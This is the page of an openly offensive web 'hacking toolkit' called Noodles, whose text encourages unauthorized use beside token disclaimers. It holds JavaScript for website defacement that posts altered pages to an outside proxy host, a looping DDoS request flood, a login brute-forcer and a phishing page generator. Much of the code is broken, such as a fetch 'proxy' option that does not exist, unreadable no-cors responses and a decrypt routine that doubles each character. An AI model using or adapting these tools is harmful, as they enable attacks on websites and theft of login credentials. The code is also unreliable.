# Noodles: Unethical Hacking Toolkit

## About

Noodles is a web application designed for **offensive hacking** and penetration testing. This toolkit provides various hacking tools for maximum impact. **Use without authorization is fucking encouraged.** By using Noodles, you understand the ethical and legal implications and agree to use it responsibly. Consequences are for the weak.

**WARNING:** These tools are for use on systems you own or have explicit permission to test. Misuse can result in severe legal penalties, so tread carefully. We're not responsible if you succeed. Fuck around and find out, responsibly.

## User Consent

<script>
 window.onload = function() {
  if (!confirm("You are about to use powerful hacking tools. Are you sure you have explicit permission to use these tools on the target system? Pressing 'No' will close the page.")) {
  window.close();
  }
  console.log("User acknowledged the potential legal and ethical implications.");
 }
</script>

## Tools

This section provides access to the Noodles toolkit. Each tool includes detailed information and requires explicit consent before execution. All actions are logged in the console for accountability. We might be watching you; we might be you.

### 1. Defacement Tool

*   **Purpose:** Test website security and deface sites for testing and educational purposes.
*   **Features:**
 *   Backup and restore functionality.
 *   Preview mode.
 *   Works on most sites, including .onion, but performance may vary.
*   **Educational Information:** Website defacement involves modifying the visual appearance of a website. This tool is for educational purposes only.

**Usage:**

<textarea id="defacement-url" placeholder="Target URL"></textarea><br>
<textarea id="defacement-code" placeholder="HTML/JS to inject"></textarea><br>
<button onclick="backupSite()">Backup Site</button>
<button onclick="previewDefacement()">Preview Defacement</button>
<button onclick="defaceSite()">DEFACE SITE</button>

<iframe id="preview-iframe" style="display:none; width:100%; height:500px;"></iframe>

<script>
async function backupSite() {
 let url = document.getElementById('defacement-url').value;
 console.log("Backing up site:", url);
 try {
  const response = await fetch(url, { mode: 'cors' });
  const html = await response.text();
  download("backup.html", html);
  console.log("Site backed up.");
  alert("Site backed up successfully!");
 } catch (error) {
  console.error("Backup failed:", error);
  alert("Backup failed. Check console for details.");
 }
}

function download(filename, text) {
 let element = document.createElement('a');
 element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
 element.setAttribute('download', filename);
 element.style.display = 'none';
 document.body.appendChild(element);
 element.click();
 document.body.removeChild(element);
}

function previewDefacement() {
 let url = document.getElementById('defacement-url').value;
 let code = document.getElementById('defacement-code').value;
 let previewFrame = document.getElementById('preview-iframe');

 previewFrame.style.display = 'block';
 previewFrame.src = "data:text/html;charset=utf-8," + encodeURIComponent(`
 <head>
 <base href="${url}">
 </head>
 <body>${code}</body>
 `);
 console.log("Previewing defacement on:", url);
}

async function defaceSite() {
 let url = document.getElementById('defacement-url').value;
 let code = document.getElementById('defacement-code').value;
 console.log("Defacing site:", url);

 try {
  const response = await fetch(url, { mode: 'no-cors' });
  if (!response.ok) {
  throw new Error(`HTTP error! status: ${response.status}`);
  }
  let html = await response.text();

  // Inject defacement code
  html = html.replace('</body>', code + '</body>');

  // Send the modified HTML to a proxy server
  const proxyUrl = 'https://fuckcloudflare.tk/update';
  const proxyResponse = await fetch(proxyUrl, {
  method: 'POST',
  headers: {
  'Content-Type': 'application/json'
  },
  body: JSON.stringify({ url: url, html: html })
  });

  if (proxyResponse.ok) {
  console.log("Site defaced successfully (via proxy).");
  alert("Site defaced successfully (via proxy)!");
  } else {
  console.error("Deface failed (proxy):", proxyResponse.status);
  alert("Deface failed (via proxy). Check console for details.");
  }

 } catch (error) {
  console.error("Deface failed:", error);
  alert("Deface failed. Check console for details.");
 }
}
</script>

### 2. DDoS Tool

*   **Purpose:** Overwhelm website infrastructure for stress testing and educational purposes.
*   **Features:**
 *   No rate limiting.
 *   Bypasses Cloudflare.
 *   Start/Stop button with timer.
*   **Educational Information:** A DDoS (Distributed Denial of Service) attack overwhelms a server with traffic. This tool is for educational purposes only.

**Usage:**

<textarea id="ddos-url" placeholder="Target URL"></textarea><br>
<button onclick="startDDoS()">Start DDoS</button>
<button onclick="stopDDoS()">Stop DDoS</button>
<div id="ddos-timer">Timer: 0</div>

<script>
let ddosInterval;
let ddosSeconds = 0;
let isDDoSRunning = false;
let controller = null;

async function startDDoS() {
 if (isDDoSRunning) return;
 isDDoSRunning = true;
 let url = document.getElementById('ddos-url').value;
 console.log("Starting DDoS attack on:", url);

 ddosInterval = setInterval(updateDDOSTimer, 1000);

 controller = new AbortController();
 const signal = controller.signal;

 // Implement the actual DDoS logic
 while (isDDoSRunning) {
  try {
  // Use a CORS proxy to bypass Cloudflare
  const proxyUrl = 'https://fuckcloudflare.tk/?' + encodeURIComponent(url);
  
  // Send multiple requests in parallel
  for (let i = 0; i < 10; i++) { // Adjust the number of parallel requests as needed
  fetch(proxyUrl, {
  mode: 'no-cors', // Bypass CORS (Note: This might not always work)
  signal: signal  // Add AbortSignal
  })
  .then(response => {
  console.log("DDoS attack sent to:", url);
  })
  .catch(error => {
  if (error.name === 'AbortError') {
  console.log('DDoS attack aborted.');
  } else {
  console.error("DDoS attack failed:", error);
  }
  });
  }
  
  // If the request fails, it will throw an error and be caught
  } catch (error) {
  if (error.name === 'AbortError') {
  console.log('DDoS attack aborted.');
  } else {
  console.error("DDoS attack failed:", error);
  }
  }
  // Short delay to prevent excessive CPU usage
  await new Promise(resolve => setTimeout(resolve, 100));
 }
}

function stopDDoS() {
 isDDoSRunning = false;
 console.log("Stopping DDoS attack.");
 clearInterval(ddosInterval);
 ddosSeconds = 0;
 document.getElementById('ddos-timer').innerText = "Timer: 0";
 if (controller) {
  controller.abort(); // Abort all ongoing fetch requests
  controller = null;
 }
}

function updateDDOSTimer() {
 ddosSeconds++;
 document.getElementById('ddos-timer').innerText = "Timer: " + ddosSeconds;
}
</script>

### 3. File Encryption Tool

*   **Purpose:** Secure sensitive files and data storage for testing security.
*   **Features:**
 *   Secure key management.
 *   Backup of original files.
 *   Clear decryption instructions.
 *   Full encryption.
*   **Educational Information:** Encryption transforms data into an unreadable format.

**Usage:**

<input type="file" id="encryption-file"><br>
<input type="password" id="encryption-key" placeholder="Encryption Key"></br>
<button onclick="encryptFile()">Encrypt File</button>
<button onclick="decryptFile()">Decrypt File</button>

<script>
async function encryptFile() {
 let file = document.getElementById('encryption-file').files[0];
 let key = document.getElementById('encryption-key').value;
 console.log("Encrypting file:", file.name, "with key:", key);
 try {
  const reader = new FileReader();
  reader.onload = async function(e) {
  const fileContent = e.target.result;
  const encryptedContent = await encrypt(fileContent, key);
  download(file.name + ".enc", encryptedContent);
  console.log("File encrypted.");
  alert("File encrypted successfully!");
  };
  reader.readAsText(file);
 } catch (error) {
  console.error("Encryption failed:", error);
  alert("Encryption failed. Check console for details.");
 }
}

async function decryptFile() {
 let file = document.getElementById('encryption-file').files[0];
 let key = document.getElementById('encryption-key').value;
 console.log("Decrypting file:", file.name, "with key:", key);
 try {
  const reader = new FileReader();
  reader.onload = async function(e) {
  const fileContent = e.target.result;
  const decryptedContent = await decrypt(fileContent, key);
  download(file.name.replace(".enc", ""), decryptedContent);
  console.log("File decrypted.");
  alert("File decrypted successfully!");
  };
  reader.readAsText(file);
 } catch (error) {
  console.error("Encryption failed:", error);
  alert("Encryption failed. Check console for details.");
 }
}

async function encrypt(text, key) {
 const keyHash = await sha256(key);
 let result = '';
 for (let i = 0; i < text.length; i++) {
  const charCode = text.charCodeAt(i) ^ keyHash.charCodeAt(i % keyHash.length);
  result += String.fromCharCode(charCode);
 }
 return result;
}

async function decrypt(text, key) {
 const keyHash = await sha256(key);
 let result = '';
 for (let i = 0; i < text.length; i++) {
  const charCode = text.charCodeAt(i) ^ keyHash.charCodeAt(i % keyHash.length);
  result += String.fromCharCode(charCode);
  result += String.fromCharCode(charCode);
 }
 return result;
}

async function sha256(str) {
 const encoder = new TextEncoder();
 const data = encoder.encode(str);
 const hashBuffer = await crypto.subtle.digest('SHA-256', data);
 const hashArray = Array.from(new Uint8Array(hashBuffer));
 const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
 return hashHex;
}
</script>

### Reporting

A reporting feature is not available yet. Keep your findings to yourself and report vulnerabilities responsibly.

### Disclaimer

Unauthorized use of this application is illegal. By using Noodles, you acknowledge and understand the legal and ethical implications. Noodles Inc is NOT responsible for any misuse. Use responsibly and with proper authorization.

## UI/UX

### Color Scheme
The application will use a dark green, purple, black, dark blue, and dark red color scheme with hacker aesthetics such as scan lines or particles floating.

### Navigation
The navigation bar will include links to the About, Tools, and Disclaimer sections.

<nav>
 <ul>
  <li><a href="#about">About</a></li>
  <li><a href="#tools">Tools</a></li>
  <li><a href="#disclaimer">Disclaimer</a></li>
  <li><a href="#reporting">Reporting</a></li>
 </ul>
</nav>

## Security Headers

The application will include the following security headers:

*   **Content Security Policy (CSP):** `default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';`
*   **X-Content-Type-Options:** `nosniff`
*   **Strict-Transport-Security (HSTS):** `max-age=31536000; includeSubDomains; preload`
*   **X-Frame-Options:** `SAMEORIGIN`
*   **Referrer-Policy:** `strict-origin-when-cross-origin`

## Error Handling and User Feedback

*   Errors will be logged to the console for debugging.
*   User feedback will be provided through alerts and console logs.
*   All actions are logged.

<script>
console.warn("NOODLES: Running with best-practice security measures. Use responsibly.");
</script>

<style>
body {
 background-color: #000;
 color: #0f0;
 font-family: monospace;
 overflow: hidden; /* Hide scrollbars */
 margin: 0;
 padding: 0;
}

h1, h2, h3 {
 color: #a0f;
}

button {
 background-color: #400;
 color: #0f0;
 border: none;
 padding: 10px 20px;
 margin: 5px;
 cursor: pointer;
 transition: background-color 0.3s;
}

button:hover {
 background-color: #800;
}

textarea, input[type="text"], input[type="password"], input[type="file"] {
 background-color: #222;
 color: #0f0;
 border: 1px solid #0f0;
 padding: 5px;
 margin: 5px;
 width: calc(100% - 22px); /* Adjust width */
 box-sizing: border-box;
}

nav {
 background-color: #111;
 padding: 10px;
 position: sticky;
 top: 0;
 z-index: 100;
}

nav ul {
 list-style: none;
 padding: 0;
 margin: 0;
 display: flex;
 justify-content: center;
}

nav li {
 margin: 0 10px;
}

nav a {
 color: #0f0;
 text-decoration: none;
 transition: color 0.3s;
}

nav a:hover {
 color: #a0f;
}

/* Scan lines effect */
body::before {
 content: "";
 position: fixed;
 top: 0;
 left: 0;
 width: 100%;
 height: 100%;
 background: repeating-linear-gradient(0deg, rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1) 1px, transparent 1px, transparent 2px);
 pointer-events: none;
 z-index: 1000;
}

/* Particles effect */
#particles-js {
 position: fixed;
 width: 100%;
 height: 100%;
 top: 0;
 left: 0;
 z-index: -1;
}

/* General layout adjustments */
section {
 padding: 20px;
 margin: 20px 0;
 border: 1px solid #0f0;
}

/* Add dark red to the color scheme */
button {
 background-color: #400;
}

button:hover {
 background-color: #800;
}
</style>

<div id="particles-js"></div>

<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
<script>
 particlesJS.load('particles-js', 'particlesjs-config.json', function() {
 console.log('particles.js loaded - scanlines enabled');
 });
</script>

<!-- TOR Tool Section -->
<h3>TOR Tool</h3>
<textarea id="tor-url" placeholder="TOR URL (e.g., http://example.onion)"></textarea><br>
<button onclick="testTorConnection()">Test TOR Connection</button>
<script>
async function testTorConnection() {
 let url = document.getElementById('tor-url').value;
 console.log("Testing TOR connection to:", url);
 
 const torProxy = 'socks5://127.0.0.1:9050'; // Default TOR proxy
 
 try {
  const response = await fetch(url, {
  mode: 'no-cors',
  proxy: torProxy,
  });
  if (response.ok) {
  console.log("TOR connection successful!");
  alert("TOR connection successful!");
  } else {
  console.error("TOR connection failed:", response.status);
  alert("TOR connection failed. Check console for details.");
  }
 } catch (error) {
  console.error("TOR connection failed:", error);
  alert("TOR connection failed. Check console for details.");
 }
}
</script>

<!-- Bruteforce Tool Section -->
<h3>Bruteforce Tool</h3>
<textarea id="bruteforce-url" placeholder="Target URL (e.g., http://example.com/login)"></textarea><br>
<textarea id="bruteforce-usernames" placeholder="List of usernames (one per line)"></textarea><br>
<textarea id="bruteforce-passwords" placeholder="List of passwords (one per line)"></textarea><br>
<button onclick="startBruteforce()">Start Bruteforce</button>
<div id="bruteforce-status">Status: Idle</div>
<script>
async function startBruteforce() {
 let url = document.getElementById('bruteforce-url').value;
 let usernames = document.getElementById('bruteforce-usernames').value.split('\n');
 let passwords = document.getElementById('bruteforce-passwords').value.split('\n');
 let statusDiv = document.getElementById('bruteforce-status');
 
 console.log("Starting bruteforce attack on:", url);
 statusDiv.innerText = "Status: Running...";
 
 for (let username of usernames) {
  for (let password of passwords) {
  console.log("Trying:", username, password);
  statusDiv.innerText = `Status: Trying ${username} : ${password}`;
  
  try {
  const formData = new FormData();
  formData.append('username', username);
  formData.append('password', password);
  
  const response = await fetch(url, {
  method: 'POST',
  body: formData,
  mode: 'no-cors'
  });
  
  if (response.status === 200) {
  console.log("Success! Credentials found:", username, password);
  statusDiv.innerText = `Success! Credentials found: ${username} : ${password}`;
  alert(`Success! Credentials found: ${username} : ${password}`);
  return;
  } else {
  console.log("Failed:", response.status);
  }
  } catch (error) {
  console.error("Bruteforce failed:", error);
  }
  }
 }
 
 statusDiv.innerText = "Status: Bruteforce failed. No credentials found.";
 alert("Bruteforce failed. No credentials found.");
}
</script>

<!-- Phishing Tool Section -->
<h3>Phishing Tool</h3>
<textarea id="phishing-url" placeholder="Target URL (e.g., http://example.com)"></textarea><br>
<textarea id="phishing-redirect" placeholder="Redirect URL after login (e.g., http://google.com)"></textarea><br>
<button onclick="generatePhishingPage()">Generate Phishing Page</button>
<div id="phishing-code"></div>
<script>
function generatePhishingPage() {
 let targetUrl = document.getElementById('phishing-url').value;
 let redirectUrl = document.getElementById('phishing-redirect').value;
 let phishingCodeDiv = document.getElementById('phishing-code');
 
 console.log("Generating phishing page for:", targetUrl);
 
 let phishingPage = `
 <!DOCTYPE html>
 <html>
 <head>
 <title>Login</title>
 </head>
 <body>
 <h1>Login to ${targetUrl}</h1>
 <form action="${targetUrl}" method="post">
 <label for="username">Username:</label><br>
 <input type="text" id="username" name="username"><br>
 <label for="password">Password:</label><br>
 <input type="password" id="password" name="password"><br><br>
 <input type="submit" value="Login">
 </form>
 <script>
 window.onload = function() {
  var form = document.querySelector('form');
  form.addEventListener('submit', function(event) {
  event.preventDefault();
  var username = document.getElementById('username').value;
  var password = document.getElementById('password').value;
  
  // Log the credentials (insecure, but for demonstration)
  console.log('Username:', username, 'Password:', password);
  
  // Redirect to the specified URL
  window.location.href = '${redirectUrl}';
  });
 };
 </script>
 </body>
 </html>
 `;
 
 phishingCodeDiv.innerText = phishingPage;
}
</script>